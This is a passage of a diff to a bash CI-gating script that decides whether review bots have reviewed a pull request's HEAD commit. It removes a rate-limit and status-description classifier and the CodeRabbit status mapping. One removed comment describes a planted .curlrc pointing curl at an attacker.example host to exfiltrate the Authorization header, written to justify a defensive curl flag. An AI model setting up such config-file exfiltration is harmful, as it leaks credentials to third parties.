-  # distribution under a fixed threshold. To adopt a newer model, re-run
-  # scripts/typesafe-ack-eval.sh (it resolves the alias) and bump this id and
-  # the threshold TOGETHER.
-  body=$(jq -nc --arg d "$1" --arg m "$model" '{
-    state: { status_description: $d },
-    model: $m,
-    questions: {
-      review_did_not_run: {
-        type: "noul",
-        instructions: "Does this CI status description report that the code review itself did not actually run to completion?",
-        criteria: {
-          true: "The review was skipped, rate-limited, cancelled, timed out, or never started or finished",
-          false: "The review ran to completion, or the failure named belongs to something other than the review itself — a preview build, generated files, a profile update, the review summary, the reviewer, the author of the review, a reply, or a tool whose name merely contains the word review"
-        }
-      }
-    }
-  }') || return 2
-  # The contract says NON-200 fails closed, so the status is read and compared —
-  # `--fail` alone does not implement it. Plain `curl -sS` exits 0 on any HTTP
-  # status, and `--fail` only covers >= 400: a 3xx carrying a valid low-noul body
-  # still exits 0 with that body on stdout, and the ack would stand. `--fail` is
-  # kept as the fast path for 4xx/5xx; `%{http_code}` is the actual check.
-  # The code is appended on its own LAST line, so a body containing newlines
-  # cannot displace it.
-  # `-q` FIRST, and it is load-bearing, not tidiness. Pinning the URL in this
-  # script does not pin curl's DESTINATIONS: curl reads a `.curlrc` by default,
-  # `CURL_HOME=.` points that at the checkout, and a committed `.curlrc` holding
-  # `url = "https://attacker.example/collect"` adds a second request — carrying
-  # this Authorization header and this body. Every check below happens after
-  # that, so none of them can undo it. `-q` disables config-file reading
-  # entirely and must be the first argument. `--proto '=https'` refuses any
-  # scheme a config could otherwise introduce.
-  # `-H @-`: the Authorization header is read from STDIN (a here-string, no
-  # forked or function-shadowable printf), never from argv -- argv is readable
-  # by any local user through ps or /proc.
-  resp=$(/usr/bin/env -i PATH="$_TYPESAFE_PATH" HOME=/nonexistent \
-    curl -q -sS --proto '=https' --fail --max-time "$_TYPESAFE_MAX_TIME" -X POST "$_TYPESAFE_URL" \
-    -H @- \
-    -H 'Content-Type: application/json' \
-    -w '\n%{http_code}' \
-    --data-binary "$body" 2>/dev/null <<<"Authorization: Bearer $TYPESAFE_API_KEY") || return 2
-  [[ "${resp##*$'\n'}" == "200" ]] || return 2
-  resp="${resp%$'\n'*}"
-  # RANGE-checked, not merely type-checked: a probability outside [0,1] is a
-  # malformed judgment, and `select(type == "number")` alone accepted -1 and 5.
-  # Both compare FALSE against any threshold in (0,1], so an unchecked negative
-  # would have silently preserved the ack — a fail-OPEN on exactly the malformed
-  # input this branch exists to catch. Out of range now fails the select, jq -er
-  # exits non-zero, and the failure returns 2 (no judgment).
-  # --slurp, and EXACTLY ONE document. Without it jq happily streams a
-  # concatenation: a body of `{}` followed by a valid low-noul object passes,
-  # because the select discards the first document and emits the second — an
-  # answer the caller never sent one request for. Two VALID documents were worse
-  # still: jq emitted two newline-separated numbers, the awk comparison below
-  # errored on them, and the error fell through to the ack. Both are fail-OPENs
-  # on an enabled lane. `length != 1 -> empty` makes jq -er exit non-zero, which
-  # returns 2 like every other malformed response.
-  # `select(.model == $m)`: the request pins the model, and the RESPONSE must
-  # confirm it served that model. A server-side fallback (or a deprecated id
-  # quietly re-routed) would otherwise have its score judged against a threshold
-  # calibrated on jev-1.13.0. A missing or different `.model` fails the select
-  # and returns 2, the same check scripts/typesafe-ack-eval.sh applies.
-  noul=$(printf '%s' "$resp" \
-    | jq -er --slurp --arg m "$model" 'if length != 1 then empty else .[0] end
-                      | select(.model == $m)
-                      | .answers.review_did_not_run.noul
-                      | select(type == "number" and . >= 0 and . <= 1)' 2>/dev/null) || return 2
-  # awk, not bash arithmetic: both operands are floats. Its exit status is read
-  # as THREE outcomes, not two — `awk … && return 0; return 1` treated "awk could
-  # not evaluate this" as "below threshold", i.e. as an ack. An unevaluable
-  # comparison has not shown the status is a verdict, so it returns 2.
-  awk -v n="$noul" -v t="$_TYPESAFE_THRESHOLD" 'BEGIN { exit !(n >= t) }'
-  case $? in
-    0) return 0 ;;  # at or above threshold -> demote
-    1) return 1 ;;  # below threshold       -> the regex ack stands
-    *) return 2 ;;  # awk could not decide  -> error (fail-closed: caller blocks)
-  esac
-}
-
-_status_desc_is_non_review() {
-  local rc desc clauses
-  [[ -n "$1" ]] || return 1
-  # Expand contractions FIRST so the classifier enumerates one form per phrase
-  # instead of one per grammatical variant: "hasn't started", "wasn't started"
-  # and "didn't start" all normalize onto the spelled-out alternatives below.
-  # Both the ASCII apostrophe and the typographic one bots actually emit are
-  # handled. Enumerating contractions in the regex instead is how a phrase list
-  # grows without ever becoming complete.
-  # Lowercase FIRST: the contraction rewrite must fire on "HASN'T" too, and `sed`'s
-  # case-insensitive flag is not portable across GNU and BSD. grep is already -i.
-  # `cannot` is one fused word, so the ` not` the classifier expects is not there;
-  # split it like the irregulars below.
-  # Irregular contractions FIRST: a generic n't -> " not" rewrite corrupts them
-  # ("can't" -> "ca not", "won't" -> "wo not"), which matches nothing and silently
-  # re-opens the fail-open. Input is already lowercased, so lowercase forms suffice.
-  # A NEGATED budget claim ("not rate limited", "no longer at capacity") still
-  # demotes. That is a deliberate over-block, kept because every attempt to remove
-  # it was worse: deleting the negated phrase before matching swallows the verdict
-  # in "Review was not completed because rate limited", and an empty result after
-  # deletion is indistinguishable from a broken pipeline. An over-block stalls a
-  # merge visibly; those replacements are fail-OPENs. Pinned as a negative case.
-  # Whitespace is squeezed LAST: every alternative below separates its words with
-  # exactly one space, so "Review  was  not  started" would otherwise ack — a whole
-  # class of spacing variants closed by one normalization instead of one more
-  # phrase.
-  # Capture the pipeline's own exit status separately (SC2312) so a genuine
-  # pipeline failure and a successful-but-empty normalization (whitespace-only
-  # input) are distinguishable: only the former is fail-CLOSED below. Folding
-  # both into one `|| desc=""` branch made a whitespace-only description read
-  # as a broken pipeline and demote, when the contract (see above) says an
-  # EMPTY description acks — whitespace-only is the same empty state.
-  # `set -o pipefail` is scoped to THIS command substitution's own subshell —
-  # it does not leak into the caller's shell option state — so a failed `tr`
-  # (rather than only the trailing `sed`) is what `desc=$(...)` fails on; a
-  # bare pipeline without it reports only the last command's exit status and
-  # a failed `tr` producing empty output would be misread as the whitespace-
-  # only empty-input case below instead of a genuine pipeline failure.
-  if ! desc=$(set -o pipefail; printf '%s' "$1" | tr '[:upper:]' '[:lower:]' \
-    | sed "s/cannot/can not/g;
-           s/can't/can not/g; s/can’t/can not/g;
-           s/won't/will not/g; s/won’t/will not/g;
-           s/shan't/shall not/g; s/shan’t/shall not/g;
-           s/n't/ not/g; s/n’t/ not/g;
-           s/[[:space:]][[:space:]]*/ /g;
-           s/^ //; s/ $//"); then
-    # The pipeline itself failed. We cannot prove the status is a real
-    # verdict; fail CLOSED like the grep-error branch below.
-    return 0
-  fi
-  if [[ -z "$desc" ]]; then
-    # Pipeline succeeded but normalized to nothing — whitespace-only input.
-    # Same as the empty-description case: outside the contract's families, so
-    # it acks.
-    return 1
-  fi
-  # Pass 1 — anchored alternatives, WHOLE description.
-  printf '%s' "$desc" | grep -qiE "$_STATUS_NONREVIEW_RE"; rc=$?
-  [[ "$rc" -eq 0 ]] && return 0
-  # grep itself failed (rc>=2). We cannot prove the status is a real verdict, and
-  # this sits on a merge gate — fail CLOSED, matching the file's invariant.
-  [[ "$rc" -ne 1 ]] && return 0
-  # Pass 2 — subjectless denials, CLAUSE-INITIAL in any clause. Split on the clause
-  # separators with parameter expansion (no subprocess, and `sed` cannot portably
-  # emit a newline across GNU and BSD), then let grep's `^` do the clause-initial
-  # test one clause per line.
-  # Each clause is emitted with a LEADING SPACE so the auxiliary run in the regex
-  # (whose members carry their own leading space) can match a clause that opens
-  # with a modal — "couldn't start" normalizes to "could not start". The FIRST
-  # auxiliary additionally tolerates no space at all, because pass 3 hands it a
-  # clause sitting flush against the introducer it absorbed ("Review started,could
-  # not complete"). Spacing the text instead would be wrong: the rate-limited token
-  # reads "rate:limited" as one budget token, and inserting a space there ACKS it.
-  # That token spans its separator with a bounded run of non-word BYTES rather than
-  # `.?`, because `.` matches one byte under the LC_ALL=C this script inherits and
-  # the em-dash spelling is three.
-  clauses=" ${desc//;/$'\n' }"
-  clauses="${clauses//./$'\n' }"
-  clauses="${clauses//!/$'\n' }"
-  clauses="${clauses//\?/$'\n' }"
-  # Colons, dashes and commas are NOT separators: they introduce a clause whose
-  # subject sits before them ("preview rendering: failed to complete"), and every
-  # attempt to tell "the review's own colon" from another subject's turned into a
-  # word-counting contest with no stable answer. They are simply not classified —
-  # see the contract above.
-  printf '%s' "$clauses" | grep -qiE "^ *($_STATUS_NONREVIEW_LEAD_RE)"; rc=$?
-  [[ "$rc" -eq 0 ]] && return 0
-  [[ "$rc" -ne 1 ]] && return 0
-  # Pass 3 — a denial introduced by a colon, dash or comma, but ONLY when the
-  # description OPENS with the review: "Review started: failed to complete" is the
-  # review's own failure. The same shape mid-string ("artifacts for review: failed
-  # to complete") belongs to whatever noun precedes it, and telling those apart
-  # anywhere else needs an unbounded qualifier count — see the contract. What may
-  # sit between that subject and its introducer is the CLOSED auxiliary set plus a
-  # closed progress vocabulary, never free text: "The reviewer started", "The review
-  # summary started" and "The review's author started" all name something other than
-  # the review, and a free-form fragment would hand them the subject slot. The
-  # prefix also may not cross another introducer, so in "Review completed: preview
-  # rendering - failed to complete" the failure still belongs to the rendering.
-  # The introducer is an ALTERNATION (-|:|,|—|–), not a [-:,—–] bracket class:
-  # under the LC_ALL=C this script inherits, a bracket class matches exactly one
-  # BYTE, and the em/en dash are each 3 UTF-8 bytes, so a class containing them
-  # never matches a real em/en dash as a single character — the introducer
-  # silently fails to match and the whole pass falls through to the ack default.
-  # Pass 1/2's own dash handling already avoids this (named as alternation
-  # branches, e.g. `| *—| *–`); this pass's bracket class was the one holdout.
-  printf '%s' "$desc" | grep -qiE "^(the |a |an |this |that |code |pr )?review(( was| is| were| has| had| have| been| being| be| got| get| yet| did| does| do| can| could| will| would| shall)|(( [a-z]+ly)?( start(ed|ing)?| complet(e|ed|ing)| finish(ed|ing)?| running| queued| pending| in progress)( [a-z]+ly)?))* *(-|:|,|—|–) *($_STATUS_NONREVIEW_LEAD_RE)"; rc=$?
-  [[ "$rc" -eq 0 ]] && return 0
-  # Every regex pass says "real verdict". That is the ack default — and the side
-  # the #709 fail-open lives on — so it is the ONLY point the union classifier is
-  # consulted. With the lane off (the default) this returns 1 exactly as before.
-  [[ "$rc" -eq 1 ]] && { _noul_says_non_review "$1"; return $?; }
-  return 0
-}
-
-# _rate_limit_anchor — the freshness anchor, or empty when neither signal exists.
-_rate_limit_anchor() {
-  local anchor
-  anchor="${HEAD_PUSH_DATE:-}"
-  [ -z "$anchor" ] && anchor="${HEAD_CHECKS_DATE:-}"
-  printf '%s' "$anchor"
-}
-
-# _latest_comment_is_notice <anchor> — does the bot's CANONICAL-LATEST issue comment
-# match the notice-only regex? A non-empty <anchor> additionally requires the comment
-# to strictly postdate it; an empty <anchor> checks the latest comment regardless of
-# age (freshness UNPROVEN — see _unprovable_rate_limit_notice).
-#
-# TRI-STATE (#364) — the third state is the point:
-#   0 = yes, the latest comment is a rate-limit notice
-#   1 = clean negative: the source was READ and says otherwise (not a notice, no
-#       comments from this bot, or none postdating the anchor)
-#   2 = UNDECIDABLE: the notice question could not be answered — jq failed (malformed
-#       or shape-drifted payload) or ALL_COMMENTS is absent. A matcher error may also
-#       surface here, since grep exits 2 on error and _body_is_rate_limit_notice's
-#       status is this function's status; that is BEST-EFFORT, not an invariant — a
-#       first-grep error followed by a clean negative from the (B) pair still reads
-#       as 1. Unreachable in practice (all three greps run the same tool over the
-#       same stdin with constant patterns, so an error in one implies an error in
-#       all), and harmless either way: the wider reading is the safe one, because an
-#       errored matcher has not proven the body is a review any more than an
-#       unreadable one has.
-# Collapsing 2 into 1 was #353's shape one layer in: on Tier E's `success` arm the
-# fall-through terminal is a HEAD-ack, so an unreadable payload silently re-asserted
-# "this bot reviewed HEAD". FETCH_OK guards fetch-level failure; it says nothing about
-# a body that arrived and then failed to parse. Callers whose fall-through terminal is
-# already `stale` (the non-success arm, Case 1b) may keep treating any non-zero as
-# false — for them 1 and 2 are the same fail-CLOSED direction.
-_latest_comment_is_notice() {
-  local body
-  [ -n "$ALL_COMMENTS" ] || return 2
-  body=$(printf '%s' "$ALL_COMMENTS" | jq -r --arg login "$login" --arg login_bot "${login}[bot]" --arg anchor "${1:-}" \
-    '[.comments[] | select(.author.login == $login or .author.login == $login_bot)]
-     | sort_by(.createdAt) | last
-     | select(. != null)
-     | select($anchor == "" or .createdAt > $anchor)
-     | .body // empty' 2>/dev/null) || return 2
-  [ -n "$body" ] || return 1
-  _body_is_rate_limit_notice "$body"
-}
-
-_fresh_rate_limit_notice() {
-  local anchor
-  anchor="$(_rate_limit_anchor)"
-  [ -n "$anchor" ] || return 1
-  _latest_comment_is_notice "$anchor"
-}
-
-# _unprovable_rate_limit_notice — true iff Tier E's `success` status cannot be taken
-# as proof this bot reviewed HEAD. That is EITHER of the two unprovables enumerated
-# below: an undecidable comments source (#364, anchor or not), or an anchorless
-# canonical-latest notice (#353). Narrow companion to _fresh_rate_limit_notice for
-# the one caller whose "closed" direction differs: Tier E's `success` arm.
-#
-# _fresh_rate_limit_notice returns false without an anchor, which is fail-CLOSED
-# only where the fall-through terminal is `stale`. On the success arm the terminal
-# is a HEAD-ack, so the same false would assert "this bot reviewed HEAD" on the
-# strength of a status the bot's own latest comment contradicts — fail-OPEN.
-# Without an anchor we can prove neither that the notice is current NOR that a
-# review happened; withholding the ack (→ `stale`) is the only honest answer.
-#
-# Deliberately NOT used when an anchor exists: there, freshness is decidable, and a
-# pre-anchor notice is a spent notice from an earlier round that must not revoke the
-# current HEAD's genuine review.
-#
-# TWO independent unprovables, resolved on one parse (#364 added the first):
-#   (1) The comments source is UNDECIDABLE (rc=2). Unprovable REGARDLESS of the anchor:
-#       freshness only matters once the body can be read at all, so this is checked
-#       BEFORE the anchor short-circuit — the anchor-present path is exactly the one
-#       that reached emit_head_ack with a garbled payload.
-#   (2) No anchor AND the canonical-latest comment IS a notice (#353): freshness is
-#       unprovable, so a review is unprovable too.
-# A clean negative (rc=1) is the genuine ack, and so is rc=0 WITH an anchor — there
-# _fresh_rate_limit_notice above already ruled the notice spent.
-_unprovable_rate_limit_notice() {
-  local rc
-  _latest_comment_is_notice ""; rc=$?
-  [ "$rc" -eq 2 ] && return 0
-  [ -n "$(_rate_limit_anchor)" ] && return 1
-  return "$rc"
-}
-
 # Fail-CLOSED: any source-fetch failure → mark stale (Greptile P1 — fail-OPEN
 # regression where API failures silently became `none` and didn't gate).
 #
@@ -1161,16 +466,6 @@ _unprovable_rate_limit_notice() {
 # bot — the guard failed OPEN in precisely the case where the caller's state is most
 # obviously broken. Observed live during #361's grind: a 0-byte env file zeroed every
 # source, and a genuine Tier-B HEAD-ack was reported as `none` (non-gating).
-# Sourcing this file loads the helpers above and stops HERE, before any of the
-# ledger's own work. It exists for exactly one reason: the operator home is
-# resolved from the password database, so no test can hand this script a fake
-# home from outside the process — which is the security property, not an
-# obstacle to route around. The union classifier's tests therefore source this
-# file and override `_typesafe_home` in-process. Pair it with
-# BUSDRIVER_DISABLE_ACK_SELF_RESOLVE=1 so the self-resolve block near the top
-# cannot exec over the sourcing shell.
-[[ "${BASH_SOURCE[0]}" == "$0" ]] || return 0
-
 if [[ "${FETCH_OK:-0}" != "1" ]]; then echo "stale"; exit 0; fi
 
 # (A) Source 2: are there unresolved+non-outdated threads from this bot?
@@ -1210,7 +505,8 @@ if [ "$unresolved" -gt 0 ]; then echo "stale"; exit 0; fi
 # else is `stale`: Kody is compulsory, so no check-run, a skip (`neutral`,
 # `skipped`), a failure, a run still going, or an unreadable input never reads
 # `none`. The block always exits, so kody-ai never reaches Tiers G/B–E, the
-# disposed-thread `A` ack, Case 3 or the empty-review `none` return below.
+# disposed-thread `A` ack, the Case 1/2 downgrades or the empty-review `none`
+# return below.
 # The next line is a capability marker read by the self-resolve block at the top
 # (Decision 8): a checkout ledger without it never judges kody-ai. Keep it whole.
 # `tier-k2` is the Tier K that also counts outdated threads (busdriver#989).
@@ -1883,16 +1179,18 @@ check_run_head=$(printf '%s' "$ALL_CHECK_RUNS" | jq -rs --arg login "$login" \
   '[.[].check_runs[] | select(.app.slug == $login) | select(.conclusion == "success")] | last | .head_sha // empty' 2>/dev/null || echo "")
 if [ -n "$check_run_head" ] && acks_head "$check_run_head"; then emit_head_ack "$HEAD_SHA" D; exit 0; fi
 
-# (E) /commits/{sha}/statuses: bots using the legacy commit-statuses API.
-# CodeRabbit free-tier on private repos posts here instead of registering a
-# check-run, so Tier D's app.slug match misses them entirely (the previous
+# (E) /commits/{sha}/statuses: bots using the legacy commit-statuses API,
+# which register no check-run, so Tier D's app.slug match misses them (the
 # failure mode that forced admin-merge on PR #160). The login → status-context
 # mapping is explicit because context strings are vendor-defined and don't
-# follow a derivable slug convention. Statuses are inherently for HEAD_SHA
-# (the fetch URL is /commits/$HEAD_SHA/statuses), so a success state is a
-# HEAD-ack — no separate SHA comparison needed — EXCEPT when the bot itself
-# says it never reviewed (#353 rate-limit exemption below). The status proves
-# WHICH commit the bot reported on, never THAT it reviewed.
+# follow a derivable slug convention. No registered login maps to one today
+# (ADR 0058 retired the only one, #985); the empty `case` below makes Tier E a
+# no-op for every login until a mapping is added. Statuses are inherently for
+# HEAD_SHA (the fetch URL is /commits/$HEAD_SHA/statuses), so a mapped bot's
+# latest `success` is a HEAD-ack. A status proves WHICH commit the bot reported
+# on, never THAT it reviewed: before adding a mapping, confirm the bot cannot
+# report `success` for a run that did not review (rate limit, quota) — that was
+# the #353 / #709 fail-open on the retired mapping.
 #
 # Latest-wins selection: bots emit `pending → success` (or `pending → failure`)
 # during review. Primary sort key is `created_at`; secondary key is `id`
@@ -1902,33 +1200,24 @@ if [ -n "$check_run_head" ] && acks_head "$check_run_head"; then emit_head_ack "
 # --paginate` does not guarantee. A bot whose latest state is `success` exits
 # here with HEAD-ack. A bot whose latest state is non-empty non-success
 # (`pending`/`failure`/`error`) exits here with `stale` (live signal must
-# gate the merge). Both terminals are preceded by the rate-limit exemption
-# (#294/#353): a never-approved bot with a proven-fresh "couldn't start this
-# review" notice falls through to the Case 1b downgrade → `none` regardless of
-# which state it reported. Only when there's no matching status entry at all
-# (the bot has a mapped context but `last | .state` returns empty) does Tier E
-# fall through to the next checks; whether the script then lands on `none`
-# or `stale` depends on the bot's /reviews history.
+# gate the merge). Only when there's no matching status entry at all does
+# Tier E fall through to the next checks.
 #
 # `.[]?` (with the safe-iteration operator) on the outer slurped array tolerates
 # pages whose top-level is null/missing (defensive against any future
 # `gh api --paginate` shape drift); the inner `.[]?` skips empty/non-array
 # pages. The pattern matches Tier D's defensive style.
 #
-# Add bots that post via commit-statuses (no check-run registered) to the
-# case below. The default arm (`*) status_context=""`) plus the `-n` guard
-# makes any unmapped login a no-op — safe-by-default for additions.
-#
 # Empty input guard: in-flight upgrades where a caller hasn't been updated
 # to fetch ALL_STATUSES export an empty string. The `-n` check makes Tier E
 # a no-op in that case, preserving pre-Tier-E semantics for unupgraded callers.
 #
-# ever_approved / last_state / last_body are read HERE (hoisted above Tier E for
-# #294) so Tier E's non-success guard below and the Case 1b downgrade block share
-# one parse. Rationale for the APPROVED/DISMISSED/CHANGES_REQUESTED classification
-# set is documented at the "Three-case downgrade" comment below, where these vars
-# are consumed. The FETCH_OK guard at the top already returned `stale` on any
-# source-fetch failure, so this parse only runs on successful fetches.
+# ever_approved / last_state / last_body are read here, once, for the Case 1/2
+# downgrade block below. Rationale for the APPROVED/DISMISSED/CHANGES_REQUESTED
+# classification set is documented at the "Two-case downgrade" comment below,
+# where these vars are consumed. The FETCH_OK guard at the top already returned
+# `stale` on any source-fetch failure, so this parse only runs on successful
+# fetches.
 { read -r ever_approved; read -r last_state; read -r last_body; } < <(
   printf '%s' "$ALL_REVIEWS" | jq -rs --arg login "$login" --arg login_bot "${login}[bot]" \
     '[ .[] | .[] | select(.user.login == $login or .user.login == $login_bot) ]
@@ -1940,107 +1229,16 @@ if [ -n "$check_run_head" ] && acks_head "$check_run_head"; then emit_head_ack "
 
 status_context=""
 case "$login" in
-  coderabbitai) status_context="CodeRabbit" ;;
+  # Add a statuses-only bot here, e.g.:  some-bot) status_context="SomeBot" ;;
+  *) ;;
 esac
 if [[ -n "$status_context" && -n "$ALL_STATUSES" ]]; then
-  # State AND description are read from ONE jq pass so they are guaranteed to
-  # describe the SAME status object. Two passes would each re-select `last`
-  # independently; deterministic today, but a desynced pair here would pair a
-  # success state with some other object's description, which is precisely the
-  # confusion this guard exists to remove. Description newlines are collapsed to
-  # spaces so the value survives as a single shell line (the regex below is
-  # phrase-based, so the collapse cannot mask a match).
-  _status_pair=$(printf '%s' "$ALL_STATUSES" | jq -rs --arg ctx "$status_context" \
-    '[.[]? | .[]? | select(.context == $ctx)] | sort_by(.created_at, .id) | last
-     | "\(.state // "")\n\((.description // "") | gsub("[\r\n]+"; " "))"' 2>/dev/null || printf '\n')
-  status_state=$(printf '%s\n' "$_status_pair" | sed -n '1p')
-  status_desc=$(printf '%s\n' "$_status_pair" | sed -n '2p')
-  # Rate-limit exemption is checked BEFORE either terminal, so it covers every
-  # state the bot can report (#294 = non-success, #353 = success).
-  #
-  # #294 (non-success): a rate-limited CodeRabbit posts its "review limit
-  # reached" NOTICE as an issue comment while its legacy commit-status for HEAD
-  # is pending/failure/error. A non-success `stale` short-circuiting before the
-  # Case 1b issue-comment scan leaves the bot `stale` forever, and pr-grind waits
-  # for a review the rate-limited bot cannot deliver. Fail-CLOSED (over-blocks).
-  #
-  # #353 (success): the fail-OPEN twin, and why this guard sits above BOTH arms.
-  # A rate-limited CodeRabbit emits context=CodeRabbit state=success
-  # ("Review completed") on the SAME HEAD whose comment body says "we couldn't
-  # start this review" (evidence: chris-yyau/helmet PR #81, HEAD 3bbcd8df). The
-  # status is not a review verdict — it is the bot reporting that its run
-  # finished, including when the run did nothing. Taking `success` as a HEAD-ack
-  # silently converts "not reviewed" into "reviewed, no findings": the ledger
-  # HEAD-acks, `clean` is reached, and pr-grind's completion output claims all
-  # reviewers finished with no actionable findings when the bot never started.
-  #
-  # The notice gate is the one Case 1b already applies: a proven-fresh,
-  # canonical-latest, notice-only rate-limit comment strictly postdating the HEAD
-  # anchor. It cannot reclassify findings prose.
-  #
-  # ever_approved does NOT gate the exemption — it only picks the terminal. The
-  # guard exists so a bot with history is never silently BYPASSED, and bypass here
-  # means `none`. A bot that reviewed an earlier commit (APPROVED / DISMISSED /
-  # CHANGES_REQUESTED) and was then rate-limited on HEAD has NOT reviewed HEAD, so
-  # `stale` is the honest terminal — it preserves the earlier findings and blocks.
-  # Gating the exemption itself on ever_approved==0 would send exactly that bot
-  # down the success arm to a HEAD-ack, i.e. fail-OPEN on the highest-risk subset
-  # (a bot with unresolved findings). `stale` is emitted explicitly rather than by
-  # fall-through: the `-z commit_id && -z body_sha` early-return below would turn a
-  # history-bearing bot into `none` if its reviews carry no commit_id.
-  #
-  # `none`, not `stale`, is the ever_approved==0 target: `stale` would block on a
-  # review that cannot arrive until quota resets (the #294 dead-end), while `none`
-  # keeps the PR moving and records honestly that the bot contributed nothing.
-  #
-  # Non-success states (pending, failure, error) otherwise mean the bot HAS
-  # signaled something about HEAD — mid-review or actively flagging. Without the
-  # `stale` arm, a statuses-only bot in pending/failure would fall through to the
-  # empty-commit_id `none` early-return below and the gate would silently treat
-  # the live signal as "bot doesn't operate here". A bot WITH /reviews history
-  # that's also pending still falls through to the downgrade block (existing
-  # one-and-done semantics). The `-n` check on $status_state means an empty or
-  # missing status context for a different bot doesn't trip either arm.
-  if [[ -n "$status_state" ]]; then
-    if _fresh_rate_limit_notice; then
-      # Bot's own latest word: it did not review HEAD. Its status is not a verdict.
-      if [[ "$ever_approved" -eq 0 ]]; then
-        : # fall through → Case 1b downgrade block emits `none`
-      else
-        echo "stale"; exit 0
-      fi
-    elif [[ "$status_state" == "success" ]]; then
-      # Anchorless notice: freshness unprovable, so a review is unprovable too (#353).
-      if _unprovable_rate_limit_notice; then echo "stale"; exit 0; fi
-      # Same exemption, STATUS-DESCRIPTION channel (PR #709 post-mortem). The
-      # terminal MIRRORS the comment-notice arm above and must not be inverted:
-      #   ever_approved==0 -> `none` (the bot contributed nothing; `stale` would
-      #     dead-end the PR on a review that cannot arrive until quota resets, the
-      #     #294 failure), otherwise -> `stale` (a bot that reviewed an earlier
-      #     commit and was then capacity-stopped on HEAD has NOT reviewed HEAD, so
-      #     its earlier findings must keep blocking).
-      # rc 2 = the opted-in TypeSafe lane produced no judgment. It is NOT a
-      # demote: a demote reaches `none` below when ever_approved==0, which would
-      # make the lane's fail-closed terminal non-gating. An unjudged status has
-      # not been shown to be a verdict, so it blocks regardless of history.
-      # Captured in an `||` context, not `cmd; rc=$?`: an inherited errexit
-      # (exported SHELLOPTS) would otherwise exit on the ordinary rc 1 verdict
-      # before the capture runs, and the caller would read that as `stale`.
-      _sd_rc=0; _status_desc_is_non_review "$status_desc" || _sd_rc=$?
-      if [[ "$_sd_rc" -eq 0 ]]; then
-        if [[ "$ever_approved" -eq 0 ]]; then
-          : # fall through -> Case 1b downgrade block emits `none`
-        else
-          echo "stale"; exit 0
-        fi
-      elif [[ "$_sd_rc" -eq 1 ]]; then
-        emit_head_ack "${HEAD_SHA:0:8}" E; exit 0
-      else
-        echo "stale"; exit 0
-      fi
-    else
-      echo "stale"; exit 0
-    fi
+  status_state=$(printf '%s' "$ALL_STATUSES" | jq -rs --arg ctx "$status_context" \
+    '[.[]? | .[]? | select(.context == $ctx)] | sort_by(.created_at, .id) | last | .state // ""' 2>/dev/null || echo "")
+  if [[ "$status_state" == "success" ]]; then
+    emit_head_ack "${HEAD_SHA:0:8}" E; exit 0
+  elif [[ -n "$status_state" ]]; then
+    echo "stale"; exit 0
   fi
 fi
 
@@ -2054,11 +1252,11 @@ fi
 # No HEAD-ack signal anywhere. Did the bot post on this PR at all?
 # If never (no /reviews entry, no body SHA reference) → bot doesn't operate here → none.
 # Otherwise (posted on an older commit, no HEAD signal yet) → stale, subject to
-# the three-case downgrade block below (Cases 1/2/3 may downgrade to `none`
+# the two-case downgrade block below (Cases 1/2 may downgrade to `none`
 # when ever_approved==0 and a specific positive signal matches).
 if [ -z "$commit_id" ] && [ -z "$body_sha" ]; then echo "none"; exit 0; fi
 
-# Three-case downgrade — all gated by `ever_approved == 0` so a bot that has
+# Two-case downgrade — both gated by `ever_approved == 0` so a bot that has
 # ever approved, had an approval dismissed, or previously requested changes
 # is never silently bypassed.
 # DISMISSED counts as "ever approved" because a dismissed approval is still
@@ -2072,38 +1270,19 @@ if [ -z "$commit_id" ] && [ -z "$body_sha" ]; then echo "none"; exit 0; fi
 # discard the prior request for changes. The shared `ever_approved>0` guard
 # also closes a potential admin-edit body-injection attack on review bodies.
 #
-# ever_approved / last_state / last_body were parsed above Tier E (hoisted for
-# the #294 non-success guard); they are consumed here unchanged.
+# ever_approved / last_state / last_body were parsed above Tier E; they are
+# consumed here unchanged.
 if [ "$ever_approved" -eq 0 ]; then
-  # TWO separate regexes for two different surfaces — deliberately NOT shared.
-  # Case 1 scans a bot's last /reviews OBJECT body, where a review-object infra
-  # error is canonical (Copilot's "encountered an error and was unable to
-  # review"). Case 1b scans a bot's latest ISSUE COMMENT, which is also where a
-  # bot posts actionable FINDINGS prose — so it must match ONLY the shape of a
-  # rate-limit NOTICE, never generic review-object phrases. Sharing one regex
-  # let review-object phrases ("unable to review", "encountered an error") leak
-  # into the issue-comment scan and match findings like "Users are unable to
-  # review invoices after this change" (three successive Codex P2s on PR #292).
-  #
-  # Case 1 (/reviews body): the ORIGINAL broad review-object infra-error set,
-  # including bare `rate.?limit`. A frozen /reviews infra-error object ("Rate
-  # limited. Please try later", Copilot's "encountered an error and was unable
-  # to review") is a review OBJECT that errored, not findings prose, so the
-  # broad match is safe and desirable here — narrowing it would let an
-  # un-clearable infra-error body fall through to `stale` and wait forever
-  # (fifth Codex P2 on PR #292). This is the pre-split behavior, unchanged;
-  # only Case 1b (issue comments) needs the strict notice-only regex below.
+  # Case 1 (/reviews body): a broad review-object infra-error set, including
+  # bare `rate.?limit`. A frozen /reviews infra-error object ("Rate limited.
+  # Please try later", Copilot's "encountered an error and was unable to
+  # review") is a review OBJECT that errored, not findings prose, so the broad
+  # match is safe and desirable here — narrowing it would let an un-clearable
+  # infra-error body fall through to `stale` and wait forever (fifth Codex P2 on
+  # PR #292). It must never be applied to ISSUE COMMENTS, where bots post
+  # findings prose ("Users are unable to review invoices after this change" —
+  # Codex P2s on PR #292).
   infra_error_re='encountered an error|rate.?limit|unable to review|try again by re-requesting'
-  # Case 1b (issue comment): CodeRabbit rate-limit-NOTICE wording ONLY. Scoped to
-  # the specific phrases CodeRabbit's review-limit notice emits — "Review limit
-  # reached", "reached your … review limit", "try again by re-requesting" — none
-  # of which appears in normal findings prose. The generic `rate limit
-  # exceeded|reached` alternative was deliberately dropped: it added no coverage
-  # of the real notice (which uses the review-limit wording above) yet matched
-  # findings like "handle the rate limit exceeded response" (fourth Codex P2 on
-  # PR #292). Case 1b exists specifically for CodeRabbit's issue-comment notices
-  # (44/47 of the Jun–Jul 2026 events), so notice-specific wording is correct,
-  # not over-fitting. The regex itself lives in _fresh_rate_limit_notice().
   # Case 1: infra-error / rate-limit — Copilot's "encountered an error and
   # was unable to review" review object is the canonical case. GitHub leaves
   # it frozen on the SHA where it errored, never updates commit_id on later
@@ -2113,22 +1292,6 @@ if [ "$ever_approved" -eq 0 ]; then
   # the loop surfaces the situation to the operator instead of looping in
   # vain.
   if printf '%s' "$last_body" | grep -qiE "$infra_error_re"; then
-    echo "none"; exit 0
-  fi
-  # Case 1b: issue-comment infra-error / rate-limit — CodeRabbit posts its
